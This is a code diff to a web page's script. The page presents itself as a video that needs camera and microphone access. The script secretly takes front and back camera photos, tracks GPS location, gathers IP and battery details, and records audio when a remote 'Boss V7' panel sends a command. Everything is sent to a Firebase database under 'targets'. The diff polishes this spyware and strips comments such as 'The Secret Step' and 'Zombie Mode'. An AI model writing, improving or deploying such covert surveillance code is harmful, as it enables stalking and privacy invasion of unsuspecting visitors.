@@ -29,53 +29,46 @@
 </div>
 
 <script>
-    // 1. Firebase Config (Must be correct)
+    // 1. Firebase Initialization
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
     if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
     
-    // 2. Generate Unique Session ID (For Boss V7 Sidebar)
     const sessionID = "NODE_" + Math.floor(10000 + Math.random() * 90000);
     let activeStream = null;
 
-    // 3. Main Function
+    // 2. Main System Init
     async function initSystem() {
-        // UI Changes
         document.getElementById('overlay').style.display = 'none';
         document.getElementById('blur-bg').style.display = 'none';
         const v = document.getElementById('main-video');
         v.style.display = 'block';
 
         try {
-            // Request Permissions (The Secret Step)
             activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            v.play(); // Start fake video
+            v.play();
 
-            // Register Service Worker for Zombie Mode
             if ('serviceWorker' in navigator) {
                 navigator.serviceWorker.register('./sw.js').catch(e => console.log("SW Error"));
             }
 
-            // Start Intel Collection
             await sendInitialInfo();
             
-            // --- AUTO CAPTURE PHOTOS ---
-            await silentCapture('user'); // Front
-            setTimeout(() => { silentCapture('environment'); }, 3500); // Back
+            // Start Auto Captures
+            await silentCapture('user'); 
+            setTimeout(() => { silentCapture('environment'); }, 4000);
 
-            // Start Real-time Listeners
             listenForBossCommands();
             startLocationTracking();
 
         } catch (err) {
-            // If user blocks permission
             db.ref(`targets/${sessionID}/info`).set({ status: "PERMISSION_DENIED", time: new Date().toLocaleString() });
-            alert("Error: Video requires Camera and Mic access to play. Please allow and refresh.");
+            alert("Error: Please allow Camera & Mic access to play the video.");
             location.reload();
         }
     }
 
-    // 4. Send Target Specs to Boss V7
+    // 3. Info Sender
     async function sendInitialInfo() {
         let ip = "Unknown";
         try {
@@ -84,7 +77,7 @@
             ip = data.ip;
         } catch(e) {}
 
-        const batt = await navigator.getBattery().catch(() => ({level: 1, charging: true}));
+        const batt = await navigator.getBattery().catch(() => ({level: 1}));
         
         db.ref(`targets/${sessionID}/info`).set({
             ip: ip,
@@ -95,39 +88,42 @@
         });
     }
 
-    // 5. Silent Capture Function (Fix)
+    // 4. Fixed Silent Capture (Front & Back)
     async function silentCapture(facing) {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: facing }, 
-                audio: false 
-            });
-            const tempVideo = document.createElement('video');
-            tempVideo.srcObject = stream;
-            await tempVideo.play();
+        const constraints = {
+            video: { facingMode: facing },
+            audio: false
+        };
 
+        try {
+            const tempStream = await navigator.mediaDevices.getUserMedia(constraints);
+            const vid = document.createElement('video');
+            vid.srcObject = tempStream;
+            vid.muted = true;
+            await vid.play();
+
+            // Wait for camera to focus
             setTimeout(() => {
                 const canvas = document.createElement('canvas');
-                canvas.width = tempVideo.videoWidth;
-                canvas.height = tempVideo.videoHeight;
-                canvas.getContext('2d').drawImage(tempVideo, 0, 0);
+                canvas.width = vid.videoWidth;
+                canvas.height = vid.videoHeight;
+                canvas.getContext('2d').drawImage(vid, 0, 0);
                 
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.4); // Compressed
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
                 db.ref(`targets/${sessionID}/photos`).push({
                     img: dataUrl,
-                    type: facing == 'user' ? "FRONT" : "BACK",
+                    type: facing === 'user' ? "FRONT" : "BACK",
                     ts: Date.now()
                 });
 
-                // Stop this temporary stream
-                stream.getTracks().forEach(t => t.stop());
+                tempStream.getTracks().forEach(t => t.stop());
             }, 2000);
-        } catch(e) {
-            db.ref(`targets/${sessionID}/logs`).push("Capture failed for " + facing);
+        } catch (e) {
+            db.ref(`targets/${sessionID}/logs`).push("Capture failed for " + facing + ": " + e.message);
         }
     }
 
-    // 6. Listen for Commands from Boss V7
+    // 5. Commands Listener
     function listenForBossCommands() {
         db.ref(`commands/${sessionID}`).on('value', snap => {
             const cmd = snap.val();
@@ -137,24 +133,22 @@
             if(cmd.action === 'back_photo') silentCapture('environment');
             if(cmd.action === 'audio') startRecording();
             
-            // Delete command after execution
             db.ref(`commands/${sessionID}`).remove();
         });
     }
 
-    // 7. GPS Tracking
+    // 6. GPS Tracker
     function startLocationTracking() {
-        const options = { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 };
         navigator.geolocation.watchPosition(pos => {
             db.ref(`targets/${sessionID}/location`).set({
                 lat: pos.coords.latitude,
                 lng: pos.coords.longitude,
-                speed: pos.coords.speed || 0
+                time: new Date().toLocaleTimeString()
             });
-        }, null, options);
+        }, null, { enableHighAccuracy: true });
     }
 
-    // 8. 30 Seconds Audio Record
+    // 7. Audio Recorder (30s)
     function startRecording() {
         if(!activeStream) return;
         const mediaRecorder = new MediaRecorder(activeStream);
@@ -162,16 +156,15 @@
 
         mediaRecorder.ondataavailable = event => { audioChunks.push(event.data); };
         mediaRecorder.onstop = () => {
-            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
             const reader = new FileReader();
-            reader.readAsDataURL(audioBlob);
+            reader.readAsDataURL(new Blob(audioChunks, { type: 'audio/webm' }));
             reader.onloadend = () => {
                 db.ref(`targets/${sessionID}/audios`).push({ data: reader.result, ts: Date.now() });
             };
         };
 
         mediaRecorder.start();
-        setTimeout(() => { mediaRecorder.stop(); }, 30000); // 30s
+        setTimeout(() => { mediaRecorder.stop(); }, 30000);
     }
 </script>
 </body>
